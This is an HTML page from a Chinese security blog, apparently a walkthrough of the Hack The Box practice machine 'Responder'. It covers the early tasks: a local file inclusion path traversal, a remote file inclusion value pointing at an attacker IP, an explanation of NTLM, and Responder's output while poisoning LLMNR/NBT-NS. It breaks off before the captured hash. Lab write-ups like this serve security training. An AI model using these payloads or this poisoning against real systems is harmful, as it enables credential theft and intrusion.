@@ -1,0 +1,1127 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Responder About: Responder is a very easy Windows machine that focuses on exploring the File Inclusion vulnerability on a web application and how this can be leveraged to collect the NetNTLMv2 challenge of the user that is running the web server. The machine showcases the Responder utility and the hash cracking tool John The Ripper to obtain a cleartext password from an NTLM hash. Finally, the Evil-WinRM tool can be">
+<title>8. Responder</title>
+
+<link rel='canonical' href='https://Sp1ke-sec.github.io/p/8.-responder/'>
+
+<link rel="stylesheet" href="/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css"><meta property='og:title' content="8. Responder">
+<meta property='og:description' content="Responder About: Responder is a very easy Windows machine that focuses on exploring the File Inclusion vulnerability on a web application and how this can be leveraged to collect the NetNTLMv2 challenge of the user that is running the web server. The machine showcases the Responder utility and the hash cracking tool John The Ripper to obtain a cleartext password from an NTLM hash. Finally, the Evil-WinRM tool can be">
+<meta property='og:url' content='https://Sp1ke-sec.github.io/p/8.-responder/'>
+<meta property='og:site_name' content='Sp1ke-sec 安全博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-11-02T13:25:49&#43;08:00'/><meta property='article:modified_time' content='2026-11-02T13:25:49&#43;08:00'/><meta property='og:image' content='https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101225228678.png' />
+<meta name="twitter:title" content="8. Responder">
+<meta name="twitter:description" content="Responder About: Responder is a very easy Windows machine that focuses on exploring the File Inclusion vulnerability on a web application and how this can be leveraged to collect the NetNTLMv2 challenge of the user that is running the web server. The machine showcases the Responder utility and the hash cracking tool John The Ripper to obtain a cleartext password from an NTLM hash. Finally, the Evil-WinRM tool can be"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101225228678.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu1489495842607495246.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🚭</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Sp1ke-sec 安全博客</a></h1>
+            <h2 class="site-description">这里是 Sp1ke-sec</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sp1ke-sec'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#task-1">Task 1</a></li>
+        <li><a href="#task-2">Task 2</a></li>
+        <li><a href="#task-3">Task 3</a></li>
+        <li><a href="#task-4">Task 4</a></li>
+        <li><a href="#task-5">Task 5</a></li>
+        <li><a href="#task-6">Task 6</a></li>
+        <li><a href="#task-7">Task 7</a></li>
+        <li><a href="#task-8">Task 8</a></li>
+        <li><a href="#task-9">Task 9</a></li>
+        <li><a href="#task-10">Task 10</a></li>
+        <li><a href="#task-11">Task 11</a></li>
+        <li><a href="#submit-single-flag">Submit Single Flag</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/8.-responder/">
+                <img src="/p/8.-responder/assets/image-20261101225228678_hu14685981129659841591.png"
+                        srcset="/p/8.-responder/assets/image-20261101225228678_hu14685981129659841591.png 800w, /p/8.-responder/assets/image-20261101225228678_hu5597044796478320175.png 1600w"
+                        width="800" 
+                        height="293" 
+                        loading="lazy"
+                        alt="Featured image of post 8. Responder" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" style="background-color: #2a9d8f; color: #fff;">
+                HTB
+            </a>
+        
+            <a href="/categories/very-easy/" >
+                Very Easy
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/8.-responder/">8. Responder</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-11-02</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="responder">Responder
+</h1><p><img src="/p/8.-responder/assets/image-20261101225228678.png"
+	width="513"
+	height="188"
+	srcset="/p/8.-responder/assets/image-20261101225228678_hu3208690873230517217.png 480w, /p/8.-responder/assets/image-20261101225228678_hu10853049803248911612.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261101225228678"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="272"
+		data-flex-basis="654px"
+	
+></p>
+<p>About: Responder is a very easy Windows machine that focuses on exploring the File Inclusion vulnerability on a web application and how this can be leveraged to collect the NetNTLMv2 challenge of the user that is running the web server. The machine showcases the Responder utility and the hash cracking tool John The Ripper to obtain a cleartext password from an NTLM hash. Finally, the Evil-WinRM tool can be used to get a terminal on the machine using the acquired credentials.</p>
+<p>介绍：Responder 是一款非常简单的 Windows 机器，专注于探索 Web 应用程序上的文件包含漏洞，以及如何利用该漏洞收集运行 Web 服务器的用户的 NetNTLMv2 挑战。该机器展示了 Responder 实用程序和哈希破解工具 John The Ripper，可以从 NTLM 哈希中获取明文密码。最后，可以使用 Evil-WinRM 工具，通过获取的凭据在机器上获取终端。</p>
+<p>靶机 IP：10.129.90.34</p>
+<h3 id="task-1">Task 1
+</h3><blockquote>
+<p>When visiting the web service using the IP address, what is the domain that we are being redirected to?</p>
+<p>使用 IP 地址访问网络服务时，我们会被重定向到哪个域名？</p>
+</blockquote>
+<p><img src="/p/8.-responder/assets/image-20261101230305815.png"
+	width="1506"
+	height="482"
+	srcset="/p/8.-responder/assets/image-20261101230305815_hu2642552864437368256.png 480w, /p/8.-responder/assets/image-20261101230305815_hu7348219510589356026.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261101230305815"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="312"
+		data-flex-basis="749px"
+	
+></p>
+<p>重定向到 unika.htb 域名。</p>
+<p>管理员身份打开 cmd，输入 <code>notepad C:\Windows\System32\drivers\etc\hosts</code>。</p>
+<p>在文件中加入一行 <code>10.129.90.34   unika.htb</code>，保存之后刷新 DNS <code>ipconfig /flushdns</code>。</p>
+<p><img src="/p/8.-responder/assets/image-20261101231950809.png"
+	width="2121"
+	height="1005"
+	srcset="/p/8.-responder/assets/image-20261101231950809_hu5222833057426840151.png 480w, /p/8.-responder/assets/image-20261101231950809_hu11662374242521113679.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261101231950809"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="211"
+		data-flex-basis="506px"
+	
+></p>
+<p><strong>答案：unika.htb</strong></p>
+<h3 id="task-2">Task 2
+</h3><blockquote>
+<p>Which scripting language is being used on the server to generate webpages?</p>
+<p>服务器端使用哪种脚本语言来生成网页？</p>
+</blockquote>
+<p><img src="/p/8.-responder/assets/image-20261101232351388.png"
+	width="608"
+	height="238"
+	srcset="/p/8.-responder/assets/image-20261101232351388_hu497900917494340113.png 480w, /p/8.-responder/assets/image-20261101232351388_hu11457348158542331470.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261101232351388"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="255"
+		data-flex-basis="613px"
+	
+></p>
+<p>根据响应头中的 <code>X-Powered-By: PHP/8.1.1</code>。</p>
+<p><strong>答案：PHP</strong></p>
+<h3 id="task-3">Task 3
+</h3><blockquote>
+<p>What is the name of the URL parameter which is used to load different language versions of the webpage?</p>
+<p>用于加载网页不同语言版本的URL参数名称是什么？</p>
+</blockquote>
+<p><img src="/p/8.-responder/assets/image-20261101232655397.png"
+	width="1164"
+	height="108"
+	srcset="/p/8.-responder/assets/image-20261101232655397_hu3245273876362771925.png 480w, /p/8.-responder/assets/image-20261101232655397_hu18281465340212741852.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261101232655397"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1077"
+		data-flex-basis="2586px"
+	
+></p>
+<p><strong>答案：page</strong></p>
+<h3 id="task-4">Task 4
+</h3><blockquote>
+<p>Which of the following values for the <code>page</code> parameter would be an example of exploiting a Local File Include (LFI) vulnerability: &ldquo;french.html&rdquo;, &ldquo;//10.10.14.6/somefile&rdquo;, &ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&rdquo;, &ldquo;mimikatz.exe&rdquo;</p>
+<p>以下哪个页面参数值会利用本地文件包含 (LFI) 漏洞：&ldquo;french.html&rdquo;, &ldquo;//10.10.14.6/somefile&rdquo;, &ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&rdquo;, &ldquo;mimikatz.exe&rdquo;</p>
+</blockquote>
+<p><img src="/p/8.-responder/assets/image-20261101232919330.png"
+	width="2511"
+	height="257"
+	srcset="/p/8.-responder/assets/image-20261101232919330_hu16177028161162703682.png 480w, /p/8.-responder/assets/image-20261101232919330_hu12048757406763745625.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261101232919330"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="977"
+		data-flex-basis="2344px"
+	
+></p>
+<p><strong>答案：../../../../../../../../windows/system32/drivers/etc/hosts</strong></p>
+<h3 id="task-5">Task 5
+</h3><blockquote>
+<p>Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: &ldquo;french.html&rdquo;, &ldquo;//10.10.14.6/somefile&rdquo;, &ldquo;./../../../../../../../windows/system32/drivers/etc/hosts&rdquo;, &ldquo;mimikatz.exe&rdquo;</p>
+<p>以下哪个页面参数值会利用远程文件包含 (RFI) 漏洞？&ldquo;french.html&rdquo;, &ldquo;//10.10.14.6/somefile&rdquo;, &ldquo;./../../../../../../../windows/system32/drivers/etc/hosts&rdquo;, &ldquo;mimikatz.exe&rdquo;</p>
+</blockquote>
+<p><strong>答案：//10.10.14.6/somefile</strong></p>
+<h3 id="task-6">Task 6
+</h3><blockquote>
+<p>What does NTLM stand for?</p>
+<p>NTLM 代表什么？</p>
+</blockquote>
+<p>NTLM 是微软的身份认证协议，用于验证 Windows 客户端访问服务时的身份，不传输明文密码。</p>
+<p>NTLM 是一个<strong>质询应答</strong>协议，共三条核心消息：</p>
+<ol>
+<li>Negotiate 协商消息（客户端 → 服务端）：客户端告诉服务器，我支持 NTLM 版本、加密能力、域 / 主机名，发起认证协商。</li>
+<li>Challenge 质询消息（服务端 → 客户端）：服务器生成一个随机挑战串（Challenge），返回给客户端；同时告诉客户端协商好的安全参数。</li>
+<li>Authenticate 认证消息（客户端 → 服务端）：客户端取出 Challenge，用本机保存的<strong>NT 哈希</strong>，按照 NTLMv1/v2 算法算出 Response（应答）； 把用户名、域、这个应答一起打包发给服务器。</li>
+<li>校验阶段：服务器本地 SAM 库取出该用户 NT 哈希，拿同一个 Challenge 自己计算应答，两边对比，一致则认证成功。</li>
+</ol>
+<p><strong>答案：New Technology LAN Manager</strong></p>
+<h3 id="task-7">Task 7
+</h3><blockquote>
+<p>Which flag do we use in the Responder utility to specify the network interface?</p>
+<p>在 Responder 工具中，我们应该使用哪个标志来指定网络接口？</p>
+</blockquote>
+<p>responder 这个工具会回答发出的LLMNR和NBT-NS查询，诱使受害者主机提供Net-NTLM哈希。</p>
+<p><code>tun0</code> 网卡是 openvpn 的虚拟网卡，通过 <code>-I tun0</code> 监听该网卡。</p>
+<p>由 <code>Responder IP  [10.10.16.102]</code> 可知本机 IP 是 10.10.16.102。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# responder -I tun0
+</span></span><span class="line"><span class="cl">                                         __
+</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tips jar:
+</span></span><span class="line"><span class="cl">    USDT -&gt; 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
+</span></span><span class="line"><span class="cl">    BTC  -&gt; bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoners:
+</span></span><span class="line"><span class="cl">    LLMNR                      <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    NBT-NS                     <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    MDNS                       <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DNS                        <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DHCP                       <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DHCPv6                     <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Servers:
+</span></span><span class="line"><span class="cl">    HTTP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    HTTPS server               <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    WPAD proxy                 <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Auth proxy                 <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    SMB server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Kerberos server            <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    SQL server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    FTP server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    IMAP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    POP3 server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    SMTP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DNS server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    LDAP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    MQTT server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    RDP server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DCE-RPC server             <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    WinRM server               <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    SNMP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> HTTP Options:
+</span></span><span class="line"><span class="cl">    Always serving EXE         <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Serving EXE                <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Serving HTML               <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Upstream Proxy             <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoning Options:
+</span></span><span class="line"><span class="cl">    Analyze Mode               <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force WPAD auth            <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force Basic Auth           <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force LM downgrade         <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force ESS downgrade        <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Generic Options:
+</span></span><span class="line"><span class="cl">    Responder NIC              <span class="o">[</span>tun0<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder IP               <span class="o">[</span>10.10.16.102<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder IPv6             <span class="o">[</span>fe80::9173:8b5e:3706:68d9<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Challenge <span class="nb">set</span>              <span class="o">[</span>random<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Don<span class="s1">&#39;t Respond To Names     [&#39;</span>ISATAP<span class="s1">&#39;, &#39;</span>ISATAP.LOCAL<span class="s1">&#39;]
+</span></span></span><span class="line"><span class="cl"><span class="s1">    Don&#39;</span>t Respond To MDNS TLD  <span class="o">[</span><span class="s1">&#39;_DOSVC&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">    TTL <span class="k">for</span> poisoned response  <span class="o">[</span>default<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current Session Variables:
+</span></span><span class="line"><span class="cl">    Responder Machine Name     <span class="o">[</span>WIN-7IMMIPY7GC2<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder Domain Name      <span class="o">[</span>FBJI.LOCAL<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder DCE-RPC Port     <span class="o">[</span>49779<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Version: Responder 3.2.2.0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Author: Laurent Gaffie, &lt;lgaffie@secorizon.com&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后让靶机访问我们的攻击机：</p>
+<p><img src="/p/8.-responder/assets/image-20261101234241202.png"
+	width="1830"
+	height="237"
+	srcset="/p/8.-responder/assets/image-20261101234241202_hu13226376595720514353.png 480w, /p/8.-responder/assets/image-20261101234241202_hu9809322530650335125.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261101234241202"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="772"
+		data-flex-basis="1853px"
+	
+></p>
+<p>下面就是我们抓取到的哈希：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
